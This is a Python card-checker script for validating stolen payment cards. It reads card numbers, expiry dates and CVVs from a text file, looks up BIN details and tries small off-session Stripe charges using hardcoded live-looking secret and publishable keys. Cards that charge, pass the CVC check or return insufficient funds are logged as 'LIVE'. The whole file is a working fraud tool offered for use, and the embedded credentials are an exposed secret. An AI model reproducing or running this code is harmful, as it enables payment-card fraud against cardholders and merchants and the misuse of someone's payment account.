import time
import re
import requests
import json
import aiohttp

# Constants
AMOUNT = 4
CARD_PATTERN = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")
CC_FILE = 'cc.txt'
APPROVE_FILE = 'approve.txt'

async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    connector = aiohttp.TCPConnector(ssl=False)

    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    bin_info = await response.json()
                    return (
                        bin_info.get("brand", "N/A"),
                        bin_info.get("type", "N/A"),
                        bin_info.get("level", "N/A"),
                        bin_info.get("bank", "N/A"),
                        bin_info.get("country_name", "N/A"),
                        bin_info.get("country_flag", ""),
                    )
                return "Error fetching BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"
        except aiohttp.ClientError:
            return "Error parsing BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"

def save_approved_card(card_info, message):
    with open(APPROVE_FILE, 'a') as f:
        f.write(f"{card_info} - {message}\n")

def process_card(card_info, sk, pk):
    split = card_info.split("|")
    cc, mes, ano, cvv = (split + [""] * 4)[:4]

    if not all([cc, mes, ano, cvv]):
        return f"❌ Invalid card details for `{card_info}`"

    token_data = {
        'type': 'card',
        "card[number]": cc,
        "card[exp_month]": mes,
        "card[exp_year]": ano,
        "card[cvc]": cvv,
    }

    try:
        response = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            data=token_data,
            headers={
                "Authorization": f"Bearer {pk}",
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )
    except requests.RequestException as e:
        return f"❌ Error with card `{cc}`: {str(e)}"

    if response.status_code != 200:
        try:
            error_message = response.json().get("error", {}).get("message", "Unknown error")
        except json.JSONDecodeError:
            error_message = "Unknown error"

        return f"Declined ❌ for `{card_info}`: {error_message}"

    token_data = response.json()
    token_id = token_data.get("id", "")

    if not token_id:
        return f"❌ Token creation failed for `{card_info}`"

    charge_data = {
        "amount": AMOUNT * 100,
        "currency": "usd",
        'payment_method_types[]': 'card',
        "description": "Charge for product/service",
        'payment_method': token_id,
        'confirm': 'true',
        'off_session': 'true'
    }

    try:
        response = requests.post(
            "https://api.stripe.com/v1/payment_intents",
            data=charge_data,
            headers={
                "Authorization": f"Bearer {sk}",
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )
    except requests.RequestException as e:
        return f"❌ Charge error for `{cc}`: {str(e)}"
    
    charges = response.text

    try:
        charges_dict = json.loads(charges)
        charge_error = charges_dict.get("error", {}).get("decline_code", "Unknown error")
        charge_message = charges_dict.get("error", {}).get("message", "No message available")
    except json.JSONDecodeError:
        charge_error = "Unknown error (Invalid JSON response)"
        charge_message = "No message available"

    if '"status": "succeeded"' in charges:
        status = "Approved ✅"
        resp = "Charged 1$🔥"
        save_approved_card(card_info, resp)
    elif '"cvc_check": "pass"' in charges:
        status = "LIVE ✅"
        resp = "CVV Live"
        save_approved_card(card_info, resp)
    elif "generic_decline" in charges:
        status = "Declined ❌"
        resp = "Generic Decline"
    elif "insufficient_funds" in charges:
        status = "LIVE ✅"
        resp = "Insufficient funds 💰"
        save_approved_card(card_info, resp)
    else:
        status = charge_error
        resp = charge_message

    return f"{status}\n\n𝗖𝗮𝗿𝗱: `{cc}|{mes}|{ano}|{cvv}`\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {resp}"

def main():
    # Replace these with actual Stripe keys
    sk = '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'
    pk = 'pk_live_51PBixTRoZZkGwFK6C2YcEM1AU1gdr7JqiFkjWPe6AqmflSCCRl8Mmit3Bhpt18b6EGa52W4wCURZDpEIhkWQRraD00oov1prsH'

    try:
        with open(CC_FILE, 'r') as file:
            card_lines = file.readlines()
    except FileNotFoundError:
        print(f"{CC_FILE} not found.")
        return

    for card in card_lines:
        card = card.strip()
        if CARD_PATTERN.match(card):
            print(f"Processing card: {card}")
            result = process_card(card, sk, pk)
            print(result)
        else:
            print(f"Invalid card format: {card}")

if __name__ == "__main__":
    main()
    
